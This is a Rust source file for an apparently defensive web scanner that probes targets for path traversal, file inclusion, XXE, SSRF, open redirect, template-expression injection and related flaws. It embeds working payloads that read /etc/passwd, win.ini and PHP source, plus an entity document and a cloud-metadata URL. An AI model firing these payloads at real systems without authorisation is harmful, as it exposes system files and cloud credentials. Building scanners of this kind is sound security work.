//! Additional active scan checks - path traversal, file inclusion, XXE,
//! SSRF, open redirect, CSRF. All probes go through `send_probe`.

use super::checks::{
    draft_for_payload, send_base, send_probe, ActiveCheck, CheckResult, CheckSeverity,
};
use super::job::ActiveScanJob;
use crate::domain::*;
use crate::fuzzer::variants::{InjectionPoint, VariantType};
use crate::reply::ReplyService;
use crate::storage::Db;
use async_trait::async_trait;
use std::sync::Arc;

// ============================================================================
// Path Traversal Check
// ============================================================================

pub struct PathTraversalCheck;

#[async_trait]
impl ActiveCheck for PathTraversalCheck {
    fn id(&self) -> &str {
        "path-traversal"
    }

    fn name(&self) -> &str {
        "Path Traversal / Directory Traversal"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !self.applicable_types().contains(&point.variant_type) {
            return Ok(None);
        }

        let strength = job.policy.get_attack_strength(self.id());

        for payload in path_traversal_payloads(strength.payload_count()) {
            if job.is_cancelled() {
                return Ok(None);
            }

            let draft = draft_for_payload(job, point, payload);
            let Ok(resp) = send_probe(job, db, reply, draft).await else {
                continue;
            };
            let body = resp.body.to_ascii_lowercase();

            if body.contains("root:x:0:0:") || body.contains("root:*:0:0:") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::High,
                    confidence: 95,
                    cwe_id: Some(22),
                    description: format!(
                        "Path traversal in {}: /etc/passwd contents exposed",
                        point.name
                    ),
                    evidence: "Response contains /etc/passwd content".to_string(),
                    attack_payload: payload.to_string(),
                    injection_point: point.location.clone(),
                }));
            }

            if resp.body.contains("[boot loader]") || resp.body.contains("[operating systems]") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::High,
                    confidence: 95,
                    cwe_id: Some(22),
                    description: format!(
                        "Path traversal in {}: Windows boot.ini exposed",
                        point.name
                    ),
                    evidence: "Response contains boot.ini content".to_string(),
                    attack_payload: payload.to_string(),
                    injection_point: point.location.clone(),
                }));
            }

            tokio::time::sleep(tokio::time::Duration::from_millis(strength.delay_ms())).await;
        }

        Ok(None)
    }
}

fn path_traversal_payloads(count: usize) -> Vec<&'static str> {
    let all = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "/etc/passwd",
        "C:\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
    ];
    all.iter().take(count).copied().collect()
}

// ============================================================================
// Local File Inclusion (LFI) Check
// ============================================================================

pub struct LfiCheck;

#[async_trait]
impl ActiveCheck for LfiCheck {
    fn id(&self) -> &str {
        "lfi"
    }

    fn name(&self) -> &str {
        "Local File Inclusion"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !self.applicable_types().contains(&point.variant_type) {
            return Ok(None);
        }

        let strength = job.policy.get_attack_strength(self.id());

        for payload in lfi_payloads(strength.payload_count()) {
            if job.is_cancelled() {
                return Ok(None);
            }

            let draft = draft_for_payload(job, point, payload);
            let Ok(resp) = send_probe(job, db, reply, draft).await else {
                continue;
            };

            // PHP source disclosure via filter wrappers (response usually
            // base64 → check for the encoded tag too).
            if resp.body.contains("<?php") || resp.body.contains("PD9waHA") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::High,
                    confidence: 90,
                    cwe_id: Some(98),
                    description: format!(
                        "Local file inclusion in {}: PHP source exposed",
                        point.name
                    ),
                    evidence: "Response contains PHP source code (raw or base64)".to_string(),
                    attack_payload: payload.to_string(),
                    injection_point: point.location.clone(),
                }));
            }

            // /proc/self/environ leak
            if resp.body.contains("PATH=") && resp.body.contains("HTTP_") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::High,
                    confidence: 95,
                    cwe_id: Some(98),
                    description: format!(
                        "Local file inclusion in {}: /proc/self/environ exposed",
                        point.name
                    ),
                    evidence: "Response contains process environment variables".to_string(),
                    attack_payload: payload.to_string(),
                    injection_point: point.location.clone(),
                }));
            }

            tokio::time::sleep(tokio::time::Duration::from_millis(strength.delay_ms())).await;
        }

        Ok(None)
    }
}

fn lfi_payloads(count: usize) -> Vec<&'static str> {
    let all = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "/proc/self/environ",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "file:///etc/passwd",
        "php://filter/read=string.rot13/resource=index.php",
        "/var/log/apache2/access.log",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "expect://id",
    ];
    all.iter().take(count).copied().collect()
}

// ============================================================================
// Remote File Inclusion (RFI) Check
// ============================================================================

pub struct RfiCheck;

#[async_trait]
impl ActiveCheck for RfiCheck {
    fn id(&self) -> &str {
        "rfi"
    }

    fn name(&self) -> &str {
        "Remote File Inclusion"
    }

    fn applicable_types(&self) -> Vec<VariantType> {
        vec![VariantType::UrlQuery, VariantType::Cookie]
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !self.applicable_types().contains(&point.variant_type) {
            return Ok(None);
        }

        // Benign marker file on a public domain; inclusion is proven when its
        // content comes back inside the application response.
        let test_url = "http://example.com/index.html";

        let draft = draft_for_payload(job, point, test_url);
        let Ok(resp) = send_probe(job, db, reply, draft).await else {
            return Ok(None);
        };

        if resp.body.contains("Example Domain") {
            return Ok(Some(CheckResult {
                check_id: self.id().to_string(),
                name: self.name().to_string(),
                severity: CheckSeverity::Critical,
                confidence: 95,
                cwe_id: Some(98),
                description: format!(
                    "Remote file inclusion in {}: external URL content embedded in response",
                    point.name
                ),
                evidence: "Response contains example.com page content".to_string(),
                attack_payload: test_url.to_string(),
                injection_point: point.location.clone(),
            }));
        }

        Ok(None)
    }
}

// ============================================================================
// XXE (XML External Entity) Check
// ============================================================================

pub struct XxeCheck;

#[async_trait]
impl ActiveCheck for XxeCheck {
    fn id(&self) -> &str {
        "xxe"
    }

    fn name(&self) -> &str {
        "XML External Entity Injection"
    }

    fn applicable_types(&self) -> Vec<VariantType> {
        vec![VariantType::Xml]
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if point.variant_type != VariantType::Xml {
            return Ok(None);
        }

        // Whole-body replacement: the DTD must precede the root element, so a
        // node-level payload cannot declare entities.
        let doc = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#;

        for payload in [
            doc,
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>"#,
        ] {
            if job.is_cancelled() {
                return Ok(None);
            }

            let draft = full_body_draft(job, payload.as_bytes().to_vec());
            let Ok(resp) = send_probe(job, db, reply, draft).await else {
                continue;
            };
            let body = resp.body.to_ascii_lowercase();

            if body.contains("root:x:0:0:") || resp.body.contains("[boot loader]") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::High,
                    confidence: 95,
                    cwe_id: Some(611),
                    description: format!(
                        "XXE in {}: application resolves external entities and leaks file contents",
                        point.name
                    ),
                    evidence: "Entity expansion returned file contents".to_string(),
                    attack_payload: payload.to_string(),
                    injection_point: point.location.clone(),
                }));
            }
        }

        Ok(None)
    }
}

/// Draft that replaces the entire body (XML bombs / raw documents).
fn full_body_draft(job: &ActiveScanJob, body: Vec<u8>) -> ReplyDraft {
    ReplyDraft {
        method: Some(job.base_request.method.clone()),
        url: Some(job.base_request.url.clone()),
        header_overrides: job
            .base_request
            .headers
            .iter()
            .map(|(name, value)| HeaderPatch {
                name: name.clone(),
                value: value.clone().into_bytes(),
            })
            .collect(),
        body_override: Some(body),
        inheritance: ReplyInheritance::FullRequest,
        ..Default::default()
    }
}

// ============================================================================
// SSRF (Server-Side Request Forgery) Check
// ============================================================================

pub struct SsrfCheck;

#[async_trait]
impl ActiveCheck for SsrfCheck {
    fn id(&self) -> &str {
        "ssrf"
    }

    fn name(&self) -> &str {
        "Server-Side Request Forgery"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !self.applicable_types().contains(&point.variant_type) {
            return Ok(None);
        }

        let payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1",
            "http://localhost",
        ];
        let markers = ["ami-id", "instance-id", "iam/security-credentials"];

        for payload in payloads {
            if job.is_cancelled() {
                return Ok(None);
            }

            let draft = draft_for_payload(job, point, payload);
            let Ok(resp) = send_probe(job, db, reply, draft).await else {
                continue;
            };

            // Cloud metadata markers only appear if the target fetched them.
            if payload.contains("169.254.169.254") && markers.iter().any(|m| resp.body.contains(m))
            {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::High,
                    confidence: 95,
                    cwe_id: Some(918),
                    description: format!(
                        "SSRF in {}: cloud metadata endpoint fetched by server",
                        point.name
                    ),
                    evidence: "Response contains metadata marker (e.g. ami-id)".to_string(),
                    attack_payload: payload.to_string(),
                    injection_point: point.location.clone(),
                }));
            }

            tokio::time::sleep(tokio::time::Duration::from_millis(strength_delay(
                job,
                self.id(),
            )))
            .await;
        }

        Ok(None)
    }
}

fn strength_delay(job: &ActiveScanJob, check_id: &str) -> u64 {
    job.policy.get_attack_strength(check_id).delay_ms()
}

// ============================================================================
// Open Redirect Check
// ============================================================================

pub struct OpenRedirectCheck;

#[async_trait]
impl ActiveCheck for OpenRedirectCheck {
    fn id(&self) -> &str {
        "open-redirect"
    }

    fn name(&self) -> &str {
        "Open Redirect"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !self.applicable_types().contains(&point.variant_type) {
            return Ok(None);
        }

        let test_domain = "https://evil.example.com";

        let draft = draft_for_payload(job, point, test_domain);
        let Ok(resp) = send_probe(job, db, reply, draft).await else {
            return Ok(None);
        };

        if let Some(location) = resp.header("location") {
            if location.contains("evil.example.com") {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::Medium,
                    confidence: 95,
                    cwe_id: Some(601),
                    description: format!(
                        "Open redirect in {}: Location header points at attacker domain",
                        point.name
                    ),
                    evidence: format!("Location: {}", location),
                    attack_payload: test_domain.to_string(),
                    injection_point: point.location.clone(),
                }));
            }
        }

        // Meta-refresh / JS redirect variant (status stays 200)
        if resp.body.contains("evil.example.com") {
            return Ok(Some(CheckResult {
                check_id: self.id().to_string(),
                name: self.name().to_string(),
                severity: CheckSeverity::Medium,
                confidence: 75,
                cwe_id: Some(601),
                description: format!(
                    "Open redirect in {}: attacker URL embedded in redirect response",
                    point.name
                ),
                evidence: "Attacker domain reflected in redirect body".to_string(),
                attack_payload: test_domain.to_string(),
                injection_point: point.location.clone(),
            }));
        }

        Ok(None)
    }
}

// ============================================================================
// CSRF Token Check
// ============================================================================

pub struct CsrfCheck;

#[async_trait]
impl ActiveCheck for CsrfCheck {
    fn id(&self) -> &str {
        "csrf"
    }

    fn name(&self) -> &str {
        "Cross-Site Request Forgery"
    }

    fn uses_points(&self) -> bool {
        false
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        _point: &InjectionPoint,
        _db: &Arc<Db>,
        _reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        // CSRF only matters for state-changing requests.
        if !matches!(
            job.base_request.method.to_ascii_uppercase().as_str(),
            "POST" | "PUT" | "DELETE" | "PATCH"
        ) {
            return Ok(None);
        }

        // Token may arrive as header...
        let has_header_token = job.base_request.headers.iter().any(|(name, _)| {
            let lower = name.to_ascii_lowercase();
            lower.contains("csrf") || lower.contains("xsrf") || lower.contains("anti-forgery")
        });

        // ...or as a hidden form field in the body.
        let has_body_token = job
            .base_request
            .body
            .as_ref()
            .map(|body| {
                let text = String::from_utf8_lossy(body).to_ascii_lowercase();
                text.contains("csrf") || text.contains("_token") || text.contains("xsrf")
            })
            .unwrap_or(false);

        if has_header_token || has_body_token {
            return Ok(None);
        }

        Ok(Some(CheckResult {
            check_id: self.id().to_string(),
            name: self.name().to_string(),
            severity: CheckSeverity::Medium,
            confidence: 60,
            cwe_id: Some(352),
            description: format!(
                "State-changing {} request carries no CSRF token (header or form field)",
                job.base_request.method
            ),
            evidence: "No csrf/xsrf/_token indicator in request headers or body".to_string(),
            attack_payload: "N/A (no probe sent; request inspected)".to_string(),
            injection_point: "N/A".to_string(),
        }))
    }
}

// ============================================================================
// Suspicious Input Transformation (expression/template evaluation)
// ============================================================================

/// 99837 * 99763 — a product unlikely to appear in legitimate content, so
/// its presence proves the server evaluated the injected expression.
const EVAL_PRODUCT: &str = "9960038631";
const EVAL_OPERANDS: &str = "99837*99763";

pub struct SuspectTransformCheck;

#[async_trait]
impl ActiveCheck for SuspectTransformCheck {
    fn id(&self) -> &str {
        "suspect-transform"
    }

    fn name(&self) -> &str {
        "Suspicious Input Transformation (expression evaluation)"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !self.applicable_types().contains(&point.variant_type) {
            return Ok(None);
        }

        let strength = job.policy.get_attack_strength(self.id());
        let expr = EVAL_OPERANDS;
        let all: Vec<String> = vec![
            format!("${{{expr}}}"),
            format!("@({expr})"),
            format!("%{{{expr}}}"),
            format!("#{{{expr}}}"),
            format!("{{{{{expr}}}}}"),
            format!("<%= {expr} %>"),
            format!("*{{{expr}}}"),
            format!("`{expr}`"),
        ];

        for payload in all.into_iter().take(strength.payload_count().max(3)) {
            if job.is_cancelled() {
                return Ok(None);
            }

            let draft = draft_for_payload(job, point, &payload);
            let Ok(resp) = send_probe(job, db, reply, draft).await else {
                continue;
            };

            if resp.body.contains(EVAL_PRODUCT) {
                return Ok(Some(CheckResult {
                    check_id: self.id().to_string(),
                    name: self.name().to_string(),
                    severity: CheckSeverity::High,
                    confidence: 95,
                    cwe_id: Some(94),
                    description: format!(
                        "Server evaluates injected expressions in {}: arithmetic result reflected",
                        point.name
                    ),
                    evidence: format!("Product {} observed in response", EVAL_PRODUCT),
                    attack_payload: payload.clone(),
                    injection_point: point.location.clone(),
                }));
            }

            tokio::time::sleep(tokio::time::Duration::from_millis(strength.delay_ms())).await;
        }

        Ok(None)
    }
}

// ============================================================================
// TRACE Method Enabled (active canary probe)
// ============================================================================

pub struct TraceMethodCheck;

#[async_trait]
impl ActiveCheck for TraceMethodCheck {
    fn id(&self) -> &str {
        "trace-method-enabled"
    }

    fn name(&self) -> &str {
        "TRACE Method Enabled"
    }

    fn uses_points(&self) -> bool {
        false
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        _point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        let canary = format!(
            "hp{}",
            &uuid::Uuid::new_v4().to_string().replace('-', "")[..12]
        );

        let draft = ReplyDraft {
            method: Some("TRACE".to_string()),
            url: Some(job.base_request.url.clone()),
            header_overrides: vec![HeaderPatch {
                name: "X-Scanner-Trace".to_string(),
                value: canary.as_bytes().to_vec(),
            }],
            inheritance: ReplyInheritance::FullRequest,
            ..Default::default()
        };

        let Ok(resp) = send_probe(job, db, reply, draft).await else {
            return Ok(None);
        };

        if resp.status == 200 && resp.body.contains(&canary) {
            return Ok(Some(CheckResult {
                check_id: self.id().to_string(),
                name: self.name().to_string(),
                severity: CheckSeverity::Medium,
                confidence: 95,
                cwe_id: Some(200),
                description: "TRACE is enabled and echoes request headers; Cross-Site Tracing can steal HttpOnly cookies and Authorization headers"
                    .to_string(),
                evidence: "Custom X-Scanner-Trace header reflected in TRACE response".to_string(),
                attack_payload: format!("TRACE with X-Scanner-Trace: {}", canary),
                injection_point: "request method".to_string(),
            }));
        }

        Ok(None)
    }
}

// ============================================================================
// XML Input Accepted (probe for XXE-adjacent surface)
// ============================================================================

pub struct XmlInputDetectionCheck;

#[async_trait]
impl ActiveCheck for XmlInputDetectionCheck {
    fn id(&self) -> &str {
        "xml-input-detection"
    }

    fn name(&self) -> &str {
        "XML Input Accepted"
    }

    fn uses_points(&self) -> bool {
        false
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        _point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        let method = job.base_request.method.to_ascii_uppercase();
        if !matches!(method.as_str(), "POST" | "PUT" | "PATCH") {
            return Ok(None);
        }

        let xml_body = b"<?xml version=\"1.0\"?><test>1</test>".to_vec();
        let xml_draft = typed_body_draft(job, xml_body.clone(), "application/xml");
        let control_draft = typed_body_draft(job, xml_body.clone(), "application/zml");

        let Ok(xml_resp) = send_probe(job, db, reply, xml_draft).await else {
            return Ok(None);
        };
        let Ok(control_resp) = send_probe(job, db, reply, control_draft).await else {
            return Ok(None);
        };

        let parse_errors = [
            "SAXParseException",
            "XMLSyntaxError",
            "lxml.etree",
            "XML parsing error",
            "simplexml_load",
        ];
        let shows_parser = parse_errors.iter().any(|p| xml_resp.body.contains(p));

        // Server discriminates XML from a bogus content type → it parses XML.
        let accepts_xml =
            (200..400).contains(&xml_resp.status) && xml_resp.status != control_resp.status;

        if shows_parser || accepts_xml {
            return Ok(Some(CheckResult {
                check_id: self.id().to_string(),
                name: self.name().to_string(),
                severity: CheckSeverity::Info,
                confidence: if shows_parser { 95 } else { 70 },
                cwe_id: Some(611),
                description: "Endpoint parses XML input; probe for XXE with entity payloads"
                    .to_string(),
                evidence: if shows_parser {
                    "XML parser error strings observed".to_string()
                } else {
                    format!(
                        "XML accepted ({}), control content-type rejected ({})",
                        xml_resp.status, control_resp.status
                    )
                },
                attack_payload: String::from_utf8_lossy(&xml_body).to_string(),
                injection_point: "request body".to_string(),
            }));
        }

        Ok(None)
    }
}

/// Draft that replaces the body and forces a specific Content-Type.
fn typed_body_draft(job: &ActiveScanJob, body: Vec<u8>, content_type: &str) -> ReplyDraft {
    ReplyDraft {
        method: Some(job.base_request.method.clone()),
        url: Some(job.base_request.url.clone()),
        header_overrides: job
            .base_request
            .headers
            .iter()
            .filter(|(name, _)| !name.eq_ignore_ascii_case("content-type"))
            .map(|(name, value)| HeaderPatch {
                name: name.clone(),
                value: value.clone().into_bytes(),
            })
            .chain(std::iter::once(HeaderPatch {
                name: "Content-Type".to_string(),
                value: content_type.as_bytes().to_vec(),
            }))
            .collect(),
        body_override: Some(body),
        inheritance: ReplyInheritance::FullRequest,
        ..Default::default()
    }
}

// ============================================================================
// User-Agent Dependent Response
// ============================================================================

const UA_DESKTOP: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
const UA_MOBILE: &str = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1";

pub struct UserAgentDependentCheck;

#[async_trait]
impl ActiveCheck for UserAgentDependentCheck {
    fn id(&self) -> &str {
        "user-agent-dependent-response"
    }

    fn name(&self) -> &str {
        "User-Agent Dependent Response"
    }

    fn uses_points(&self) -> bool {
        false
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        _point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !job.base_request.method.eq_ignore_ascii_case("GET") {
            return Ok(None);
        }

        let desktop = send_probe(job, db, reply, ua_draft(job, UA_DESKTOP)).await;
        let mobile = send_probe(job, db, reply, ua_draft(job, UA_MOBILE)).await;
        let (Ok(desktop), Ok(mobile)) = (desktop, mobile) else {
            return Ok(None);
        };

        let status_differs = desktop.status != mobile.status;
        let length_differs =
            (desktop.body.len() as i64 - mobile.body.len() as i64).unsigned_abs() > 100;

        if status_differs || length_differs {
            return Ok(Some(CheckResult {
                check_id: self.id().to_string(),
                name: self.name().to_string(),
                severity: CheckSeverity::Info,
                confidence: 80,
                cwe_id: Some(200),
                description: format!(
                    "Response varies by User-Agent (desktop {} / {} bytes vs mobile {} / {} bytes); UA-based filtering or fingerprinting surface",
                    desktop.status,
                    desktop.body.len(),
                    mobile.status,
                    mobile.body.len()
                ),
                evidence: "Desktop and mobile User-Agents received divergent responses".to_string(),
                attack_payload: "UA rotation (desktop vs mobile)".to_string(),
                injection_point: "User-Agent header".to_string(),
            }));
        }

        Ok(None)
    }
}

fn ua_draft(job: &ActiveScanJob, user_agent: &str) -> ReplyDraft {
    ReplyDraft {
        header_overrides: job
            .base_request
            .headers
            .iter()
            .filter(|(name, _)| !name.eq_ignore_ascii_case("user-agent"))
            .map(|(name, value)| HeaderPatch {
                name: name.clone(),
                value: value.clone().into_bytes(),
            })
            .chain(std::iter::once(HeaderPatch {
                name: "User-Agent".to_string(),
                value: user_agent.as_bytes().to_vec(),
            }))
            .collect(),
        inheritance: ReplyInheritance::FullRequest,
        ..Default::default()
    }
}

// ============================================================================
// Reflected CSS Injection
// ============================================================================

pub struct CssInjectionCheck;

#[async_trait]
impl ActiveCheck for CssInjectionCheck {
    fn id(&self) -> &str {
        "reflected-css-injection"
    }

    fn name(&self) -> &str {
        "Reflected CSS Injection"
    }

    async fn execute(
        &self,
        job: &ActiveScanJob,
        point: &InjectionPoint,
        db: &Arc<Db>,
        reply: &Arc<ReplyService>,
    ) -> DomainResult<Option<CheckResult>> {
        if !self.applicable_types().contains(&point.variant_type) {
            return Ok(None);
        }

        let marker = format!(
            "hp{}",
            &uuid::Uuid::new_v4().to_string().replace('-', "")[..12]
        );
        let Ok(baseline) = send_base(job, db, reply).await else {
            return Ok(None);
        };
        if baseline.body.contains(&marker) {
            return Ok(None);
        }

        // style append (inside <style> or style="") and class append payloads
        let probes = [
            (format!(";--{}", marker), "style context"),
            (format!(" {}", marker), "class context"),
        ];

        for (payload, context) in probes {
            if job.is_cancelled() {
                return Ok(None);
            }

            let draft = draft_for_payload(job, point, &payload);
            let Ok(resp) = send_probe(job, db, reply, draft).await else {
                continue;
            };

            // Marker reflected inside a style/class attribute or <style> block
            // enables CSS exfiltration or defacement.
            if let Some(pos) = resp.body.find(&marker) {
                let window_start = pos.saturating_sub(240);
                let window = &resp.body[window_start..pos];
                if window.contains("style=\"")
                    || window.contains("style='")
                    || window.contains("class=\"")
                    || window.contains("class='")
                    || window.contains("<style")
                {
                    return Ok(Some(CheckResult {
                        check_id: self.id().to_string(),
                        name: self.name().to_string(),
                        severity: CheckSeverity::Medium,
                        confidence: 85,
                        cwe_id: Some(79),
                        description: format!(
                            "Parameter {} reflects into a {} attribute; CSS injection enables data exfiltration",
                            point.name, context
                        ),
                        evidence: "Marker reflected near style/class context".to_string(),
                        attack_payload: payload.clone(),
                        injection_point: point.location.clone(),
                    }));
                }
            }

            tokio::time::sleep(tokio::time::Duration::from_millis(strength_delay(
                job,
                self.id(),
            )))
            .await;
        }

        Ok(None)
    }
}

pub fn load_additional_checks() -> Vec<Box<dyn ActiveCheck>> {
    vec![
        Box::new(PathTraversalCheck),
        Box::new(LfiCheck),
        Box::new(RfiCheck),
        Box::new(XxeCheck),
        Box::new(SsrfCheck),
        Box::new(OpenRedirectCheck),
        Box::new(CsrfCheck),
        Box::new(SuspectTransformCheck),
        Box::new(TraceMethodCheck),
        Box::new(XmlInputDetectionCheck),
        Box::new(UserAgentDependentCheck),
        Box::new(CssInjectionCheck),
    ]
}
